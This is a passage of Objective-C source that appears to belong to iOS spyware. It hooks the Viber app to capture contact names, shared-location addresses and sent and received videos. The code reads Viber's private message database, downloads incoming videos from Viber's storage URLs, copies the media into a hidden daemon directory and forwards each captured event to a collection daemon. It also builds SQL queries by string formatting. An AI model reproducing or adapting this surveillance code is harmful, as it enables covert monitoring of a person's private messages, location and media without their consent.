        VIBFormattedMessageAction *formattedMsgAction = [attributeText action];
        DLog(@"name, %@", [formattedMsgAction name]);
        DLog(@"parameters, %@", [formattedMsgAction parameters]);
        
        NSString *contactName = [[formattedMsgAction parameters] objectForKey:@"contact_name"];
        if (contactName) {
            contactName = [NSString stringWithFormat:@"Name: %@", contactName];
            [aIMEvent setMMessage:contactName];
            [aIMEvent setMRepresentationOfMessage:kIMMessageContact];
            [aIMEvent setMAttachments:nil];
        }
    }
}

#pragma mark Send event using thread

- (void) sendViberEvent: (FxIMEvent *) aIMEvent
		   viberMessage: (VDBMessage *) aViberMessage
			 shouldWait: (BOOL) aShouldWait
		  downloadVideo: (BOOL) aDownloadVideo {
    NSNumber *wait      = [NSNumber numberWithBool:aShouldWait];
	NSNumber *download  = [NSNumber numberWithBool:aDownloadVideo];
	NSArray *extraArgs  = [[NSArray alloc] initWithObjects:aIMEvent, download, wait, aViberMessage, nil];
    [NSThread detachNewThreadSelector:@selector(threadSendViberEvent:) toTarget:[self class] withObject:extraArgs];
	[extraArgs release];
}

#pragma mark Send event thread method

+ (void) threadSendViberEvent: (NSArray *) aArgs {
    NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
    [aArgs retain];
    @try {
        FxIMEvent *imEvent          = [aArgs objectAtIndex:0];
        NSNumber *shouldDownload    = [aArgs objectAtIndex:1];
        NSNumber *shouldWait        = [aArgs objectAtIndex:2];
        VDBMessage *viberMessage    = [aArgs objectAtIndex:3];
        
        DLog(@"shouldDownload = %@, shouldWait = %@", shouldDownload, shouldWait);
        
        // Check shared location address
        if ([imEvent mRepresentationOfMessage] == kIMMessageShareLocation) {
            [NSThread sleepForTimeInterval:3.0];
            VDBLocation *viberLocation = [viberMessage location];
            FxIMGeoTag *sharedLocation = [imEvent mShareLocation];
            [sharedLocation setMPlaceName:[viberLocation address]];
            
            if (![[viberLocation address] length]) {
                // Read location address from database
                [NSThread sleepForTimeInterval:5.0];
                NSString *locationAddress = [self locationAddressFromViberDatabase:viberMessage];
                [sharedLocation setMPlaceName:locationAddress];
            }
            
            DLog (@"Viber Share location name = %@", [viberLocation address]);
            DLog (@"Viber location = %@", [viberMessage location]);
        }
        
        // Check incoming video
        if ([shouldDownload boolValue]) {
            FxAttachment *attachment = [self downloadVideoAttachmentWait:viberMessage];
            if (attachment) {
                [imEvent setMAttachments:[NSArray arrayWithObject:attachment]];
                [imEvent setMRepresentationOfMessage:(kIMMessageNone | kIMMessageText)];
            }
        }
        
        // Check new outgoing video
        if ([shouldWait boolValue]) {
            FxAttachment *attachment = [self videoAttachmentWait:viberMessage];
            if (attachment) {
                [imEvent setMAttachments:[NSArray arrayWithObject:attachment]];
                [imEvent setMRepresentationOfMessage:(kIMMessageNone | kIMMessageText)];
            }
        }
        
        // Send event to daemon
        [ViberUtils sendViberIMEvent:imEvent];
    }
    @catch (NSException *exception) {
        DLog(@"Send Viber event got exception: %@", exception);
    }
    @finally {
        ;
    }
    [aArgs release];
    [pool release];
}

#pragma mark Capture location address from db

+ (NSString *) locationAddressFromViberDatabase: (VDBMessage *) aViberMessage {
    NSString *locationAddress = nil;
    NSArray *dirPaths = NSSearchPathForDirectoriesInDomains( NSDocumentDirectory, NSUserDomainMask, YES);
    NSString *docsDir = [dirPaths objectAtIndex:0];
    NSString *databasePath = [[NSString alloc] initWithString:[docsDir stringByAppendingPathComponent:@"Contacts.data"]];
    
    NSFileManager *fileManager = [NSFileManager defaultManager];
    if ([fileManager fileExistsAtPath:databasePath]) {
        FMDatabase *db = [FMDatabase databaseWithPath:databasePath];
        [db open];
        NSNumber *seq = [aViberMessage seq];
        if (seq != nil) {
            NSString *sqlSelectZPK = [NSString stringWithFormat:@"select Z_PK from ZVIBERMESSAGE where ZSEQ = %@", seq];
            DLog (@"sqlSelectZPK = %@", sqlSelectZPK)
            FMResultSet * result = [db executeQuery:sqlSelectZPK];
            if ([result next]) {
                NSNumber *zpk = [NSNumber numberWithInt:[result intForColumnIndex:0]];
                DLog (@"ZPK value = %@", zpk)
                
                NSString *sqlSelectZAddress = [NSString stringWithFormat:@"select ZADDRESS from ZVIBERLOCATION where ZMESSAGE = %@", zpk];
                DLog (@"sqlSelectZAddress = %@", sqlSelectZAddress)
                result = [db executeQuery:sqlSelectZAddress];
                if ([result next]) {
                    locationAddress = [result stringForColumnIndex:0];
                    DLog(@"locationAddress = %@", locationAddress);
                }
            }
        }
        [db close];
    }
    
    [databasePath release];
    return (locationAddress);
}

#pragma mark Capture video attachment WAIT...

+ (FxAttachment *) videoAttachmentWait: (VDBMessage *) aViberMessage {
    DLog(@"==================== Waiting video");
    NSAutoreleasePool *waitPool = [[NSAutoreleasePool alloc] init];
    
    VDBAttachment *attachment = [aViberMessage attachment];
    
    NSArray *dirPaths = NSSearchPathForDirectoriesInDomains( NSDocumentDirectory, NSUserDomainMask, YES);
    NSString *docsDir = [dirPaths objectAtIndex:0];
    NSString *databasePath = [[NSString alloc] initWithString:[docsDir stringByAppendingPathComponent:@"Contacts.data"]];
    
    NSInteger wait = 0;
    NSFileManager *fileManager = [NSFileManager defaultManager];
    
    __block FxAttachment *fxAttachment = nil;
    __block NSString *viberAttachmentPath = [[DaemonPrivateHome daemonPrivateHome] stringByAppendingString:@"attachments/imViber/"];
    viberAttachmentPath	= [NSString stringWithFormat:@"%@%f%@", viberAttachmentPath, [[aViberMessage date] timeIntervalSince1970], [attachment name]]; // [attachment name] = 144913151362767.mp4
    
    if ([fileManager fileExistsAtPath:databasePath]) {
        FMDatabase *db = [FMDatabase databaseWithPath:databasePath];
        
        while (wait <= 5) {
            wait++;
            [db open];
            NSString *sql = [NSString stringWithFormat:@"SELECT ZURL FROM ZATTACHMENT WHERE ZNAME=\"%@\"",[attachment name]];
            if ([attachment respondsToSelector:@selector(photoLibraryAssetIdentifier)]) { // 5.6.5
                sql = [NSString stringWithFormat:@"SELECT ZPHOTOLIBRARYASSETIDENTIFIER FROM ZATTACHMENT WHERE ZNAME=\"%@\"",[attachment name]];
            }
            DLog(@"sql = %@", sql);
            FMResultSet *result = [db executeQuery:sql];
			
            if ([result next]) {
                NSString *assetUrl = [result stringForColumnIndex:0];
                DLog(@"assetUrl, %@", assetUrl);
                if ([self isAssetUrl:assetUrl]) {
                    
                    NSAssert(![NSThread isMainThread], @"can't be called on the main thread due to ALAssetLibrary limitations");
                    
                    NSURL *url = [NSURL URLWithString:assetUrl];
                    Class $ALAssetsLibrary = objc_getClass("ALAssetsLibrary");
                    ALAssetsLibrary *assetLibrary = [[$ALAssetsLibrary alloc] init];
                    [assetLibrary assetForURL:url resultBlock:^(ALAsset *asset) {
                        ALAssetRepresentation *rep = [asset defaultRepresentation];
                        Byte *buffer = (Byte*)malloc(rep.size);
                        NSUInteger buffered = [rep getBytes:buffer fromOffset:0.0 length:rep.size error:nil];
                        NSData *video = [NSData dataWithBytesNoCopy:buffer length:buffered freeWhenDone:YES];
                        if (![video writeToFile:viberAttachmentPath atomically:YES]) {
                            // iOS 9, Sandbox
                            viberAttachmentPath = [IMShareUtils saveData:video toDocumentSubDirectory:@"/attachments/imViber/" fileName:[viberAttachmentPath lastPathComponent]];
                        }
                        
                        if (!video) {
                            DLog(@"Wait... cannot get video from url");
                            viberAttachmentPath = @"video/quicktime";
                        } else {
                            DLog(@"Wait... OK, can get video from url");
                        }
                        
                        NSData *thumnail = [NSData dataWithContentsOfFile:[attachment bigPreviewPath]];
                        if (!thumnail) {
                            thumnail = [NSData dataWithContentsOfFile:[attachment previewPath]];
                        }
                        
                        fxAttachment = [[FxAttachment alloc] init];
                        [fxAttachment setFullPath:viberAttachmentPath];
                        [fxAttachment setMThumbnail:thumnail];
                        
                    } failureBlock:^(NSError *err) {
                        DLog(@"Wait... cannot get video error: %@",[err localizedDescription]);
                    }];
                } else if (assetUrl) { // ZPHOTOLIBRARYASSETIDENTIFIER
                    Class $PHAsset = objc_getClass("PHAsset");
                    PHFetchResult *result = [$PHAsset fetchAssetsWithLocalIdentifiers:[NSArray arrayWithObject:assetUrl] options:nil];
                    PHAsset *phAssetVideo = result.firstObject;
                    Class $PHImageManager = objc_getClass("PHImageManager");
                    [(PHImageManager *)[$PHImageManager defaultManager] requestAVAssetForVideo:phAssetVideo options:nil resultHandler:^(AVAsset *asset, AVAudioMix *audioMix, NSDictionary *info) {
                        
                        DLog(@"asset: %@", asset);
                        DLog(@"audioMix: %@", audioMix);
                        DLog(@"info: %@", info);
                        
                        // iOS 9, Sandbox
                        NSData *test = [@"test" dataUsingEncoding:NSUTF8StringEncoding];
                        viberAttachmentPath = [IMShareUtils saveData:test toDocumentSubDirectory:@"/attachments/imViber/" fileName:[viberAttachmentPath lastPathComponent]];
                        [[NSFileManager defaultManager] removeItemAtPath:viberAttachmentPath error:nil];
                        
                        NSURL *fileURL = [NSURL fileURLWithPath:viberAttachmentPath];
                        //__block NSData *assetData = nil;
                        
                        // asset is you AVAsset object
                        AVAssetExportSession *exportSession = [[[AVAssetExportSession alloc] initWithAsset:asset presetName:AVAssetExportPresetHighestQuality] autorelease];
                        exportSession.outputFileType = AVFileTypeMPEG4; // AVFileTypeQuickTimeMovie
                        exportSession.outputURL = fileURL;
                        
                        [exportSession exportAsynchronouslyWithCompletionHandler:^{
                            //assetData = [NSData dataWithContentsOfURL:filePath];
                            DLog(@"AVAsset saved to fileURL, %@", fileURL);
                            DLog(@"AVAsset saved to fileURL.path, %@", fileURL.path);
                            
                            // Video thumbnail
                            NSData *thumnail = [NSData dataWithContentsOfFile:[attachment bigPreviewPath]];
                            if (!thumnail) {
                                thumnail = [NSData dataWithContentsOfFile:[attachment previewPath]];
                            }
                            
                            fxAttachment = [[FxAttachment alloc] init];
                            [fxAttachment setFullPath:fileURL.path];
                            [fxAttachment setMThumbnail:thumnail];
                        }];
                    }];
                }
            }
			[db close];
            
            [NSThread sleepForTimeInterval:5.0];
            
            if (fxAttachment) {
                break;
            }
        }
    }
    [databasePath release];
    
    [waitPool release];
    return ([fxAttachment autorelease]);
}

#pragma mark Capture & download video WAIT...

+ (FxAttachment *) downloadVideoAttachmentWait: (VDBMessage *) aViberMessage {
    DLog(@"==================== Downloading video");
    NSAutoreleasePool *downloadPool = [[NSAutoreleasePool alloc] init];
    
    VDBAttachment *attachment = [aViberMessage attachment];
    NSString *attBucket = [attachment bucket];
    NSString *attID = [attachment ID];
    DLog(@"attBucket = %@", attBucket);
    DLog(@"attID = %@", attID);
    
    NSString * viberAttachmentPath = [[DaemonPrivateHome daemonPrivateHome] stringByAppendingString:@"attachments/imViber/"];
    viberAttachmentPath = [NSString stringWithFormat:@"%@%@%f.mp4",viberAttachmentPath, attID, [[aViberMessage date] timeIntervalSince1970] ];
    
    NSString *url = [NSString stringWithFormat:@"http://%@.s3.amazonaws.com/%@.mp4", attBucket, attID];
    DLog(@"==================== url: %@",url);
    NSURL * videourl = [NSURL URLWithString:url];
    
    /* 
     * It's possible that video data got is nil
     */
    NSData *video = [NSData dataWithContentsOfURL:videourl];
    DLog (@"video data %llu", (unsigned long long)[video length])
    
    NSData *videoThumbnail = [NSData dataWithContentsOfFile:[attachment bigPreviewPath]];
    if (videoThumbnail) {
        videoThumbnail = [NSData dataWithContentsOfFile:[attachment previewPath]];
    }
    FxAttachment *fxAttachment	= [[FxAttachment alloc] init];
    [fxAttachment setMThumbnail:videoThumbnail];
    if (video) {
        if (![video writeToFile:viberAttachmentPath atomically:YES]) {
            // iOS 9, Sandbox
            viberAttachmentPath = [IMShareUtils saveData:video toDocumentSubDirectory:@"/attachments/imViber/" fileName:[viberAttachmentPath lastPathComponent]];
        }
        [fxAttachment setFullPath:viberAttachmentPath];
    } else {
        [fxAttachment setFullPath:@"video/mp4"];
    }
    [fxAttachment autorelease];
    
    [downloadPool release];
    return (fxAttachment);
}

+ (BOOL) isAssetUrl: (NSString *) aUrl {
    NSURL *url = [NSURL URLWithString:aUrl];
    if ([[url scheme] isEqualToString:@"assets-library"]) {
        return (YES);
    }
    return (NO);
}

@end
